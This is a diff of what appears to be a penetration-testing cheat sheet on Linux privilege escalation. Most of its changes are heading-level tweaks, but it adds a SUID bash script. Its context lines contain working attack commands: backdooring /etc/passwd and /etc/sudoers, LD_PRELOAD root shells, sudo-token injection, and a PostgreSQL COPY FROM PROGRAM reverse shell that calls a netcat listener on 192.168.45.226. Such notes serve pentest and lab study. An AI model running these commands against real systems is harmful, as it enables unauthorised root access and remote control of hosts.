@@ -574,17 +574,24 @@ compile AdvancedProcessInjection.cpp
 AdvancedProcessInjection.exe pid
 ```
 ### Linux
-##### Directory Permissions
+###### Directory Permissions
 >A directory is handled differently from a file. Read access gives the right to consult the list of its contents (files and directories). Write access allows creating or deleting files. Finally, execute access allows crossing through the directory to access its contents (using the cd command, for example).
-##### Check what sudo permissions the user has available to them
+###### Check what sudo permissions the user has available to them
 sudo -l (if anything interesting, go look for in GTFOBins)
-##### AutoEnumeration
+###### Priviledge Escalation Script
+```
+#!/bin/bash
+chmod +s /bin/bash
+
+/bin/bash -p
+```
+###### AutoEnumeration
 linpeas.sh
-##### Nday exploits
+###### Nday exploits
 ```
 CVE-2021-3156 sudo Baron Samedit 2 sudo 1.8.2-1.8.32,1.9.0-1.9.5 downloadlink:https://codeload.github.com/worawit/CVE-2021-3156/zip/main
 ```
-##### Kernel exploits
+###### Kernel exploits
 ```
 OS version:
 cat /etc/issue  
@@ -592,17 +599,17 @@ cat /etc/*-release
 Kernel Version and Architecture: 
 uname -a
 ```
-##### GTFOBins
+###### GTFOBins
 ```
 GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.
 ```
-##### Editor PE
+###### Editor PE
 vim, less (if the editor has sudo privileges or is runned by root)
 ```
 inside vim or less, after colon(:), execute !/bin/sh
 ```
 
-##### Pspy - Unprivileged Linux Process Snooping
+###### Pspy - Unprivileged Linux Process Snooping
 Pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.
 
 ###### Find Usage
@@ -618,21 +625,21 @@ find / - type f -writable 2>/dev/null
 -perm -mode all of permission bits are set
 -perm /mode any of permission bits are set
 ```  
-##### Enumerating Unmounted Disks
+###### Enumerating Unmounted Disks
 mount  
 lsblk  
 cat /etc/fstab (/etc/fstab file lists all drives that will be mounted at boot time)
-##### Enumerating Device Drivers and Kernel Modules
+###### Enumerating Device Drivers and Kernel Modules
 1. lsmod  
 2. /sbin/modinfo libata  
 ![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/20c73182-d439-43a4-a3b5-f1fee987821c)
 
-##### Abusing Sudo
+###### Abusing Sudo
 ![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/ac8768a1-fc9f-4828-a1cc-791d4cd20972)
 ![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/be5f2545-b176-4def-8e9b-7a422814dc70)
 
 
-##### SUID permissions (anything interesting, to look for in GTFOBins)
+###### SUID permissions (anything interesting, to look for in GTFOBins)
 >SUID and SGID allow the current user to execute the file with the rights of the owner (setuid) or the owner's group (setgid)
 
 find / -perm -u=s -type f 2>/dev/null
@@ -676,7 +683,7 @@ screen(with suid) -ls # screen itself is setuid, so...
 #To completely remove the container from your system, you can use machinectl as follows
 kali@kali:sudo machinectl remove MACHINE_NAME
 ```
-##### CAP_SETUID capability
+###### CAP_SETUID capability
 The two perl binaries stand out as they have setuid capabilities enabled, along with the +ep flag specifying that these capabilities are effective and permitted
 ```
 /usr/sbin/getcap -r / 2>/dev/null
@@ -684,7 +691,7 @@ The two perl binaries stand out as they have setuid capabilities enabled, along 
 ![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/d14b5115-a1a3-45fd-a23a-c4823198184f)
 ![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/e7e8b730-4760-4848-849e-394aaca5c74e)
 
-##### Cronjob to elevate privilege
+###### Cronjob to elevate privilege
 Check if you have access with write permission on these files.  
 Check inside the file, to find other paths with write permissions.
 ```
@@ -701,7 +708,7 @@ cat /etc/crontab
 cat /etc/anacrontab
 cat /var/spool/cron/crontabs/root
 ```
-##### Insecure file permission /etc/passwd
+###### Insecure file permission /etc/passwd
  ```
  1. check if users have write permission
  2. openssl passwd evil:
@@ -710,12 +717,12 @@ openssl passwd -1 -salt hack password123
  3. echo "root2:$1$eWmYOQrX$UHeqHr4pKVFfx1rrFK05B1:0:0:root:/root:/bin/bash" >> /etc/passwd
  4. su root2, enter passwd as evil
  ```
-##### Writable /etc/sudoers
+###### Writable /etc/sudoers
 ```
 echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
 echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
 ```
-##### LD_PRELOAD and NOPASSWD
+###### LD_PRELOAD and NOPASSWD
 If LD_PRELOAD is explicitly defined in the sudoers file
 ```
 Defaults        env_keep += LD_PRELOAD
@@ -734,7 +741,7 @@ void _init() {
 }
 ```
 Execute any binary with the LD_PRELOAD to spawn a shell : sudo LD_PRELOAD=<full_path_to_so_file> <program>, e.g: sudo LD_PRELOAD=/tmp/shell.so find
-##### Sudo Inject
+###### Sudo Inject
 ```
 $ sudo whatever
 [sudo] password for user:    # Press <ctrl>+c since you don't have the password. # This creates an invalid sudo tokens.
@@ -765,7 +772,7 @@ Requirements
 Ptrace fully enabled (/proc/sys/kernel/yama/ptrace_scope == 0).  
 Current user must have living process that has a valid sudo token with the same uid.  
 >The default password timeout is 15 minutes. So if you use sudo twice in 15 minutes (900 seconds), you will not be asked to type the user’s password again.
-##### Postgresql to RCE
+###### Postgresql to RCE
 ```
 To run system commands on Linux or Windows, we need to use the PROGRAM parameter. We start with creating a table; we can name — shell.
 
@@ -782,12 +789,12 @@ command execution:
 CREATE TABLE shell(output text);
 COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.226 1234 >/tmp/f';
 ```
-##### Check Compressed files
+###### Check Compressed files
 ```
 check zip,gz,7z,stix,rar files
 ```
 
-##### Abusing /etc/sudoers
+###### Abusing /etc/sudoers
 ```
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -795,7 +802,7 @@ check zip,gz,7z,stix,rar files
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
-##### Cron using a script with a wildcard (Wildcard Injection)
+###### Cron using a script with a wildcard (Wildcard Injection)
 ```
 [root@RedHat_test ~]# man tar
  -c新建打包文件，同 -v一起使用 查看过程中打包文件名
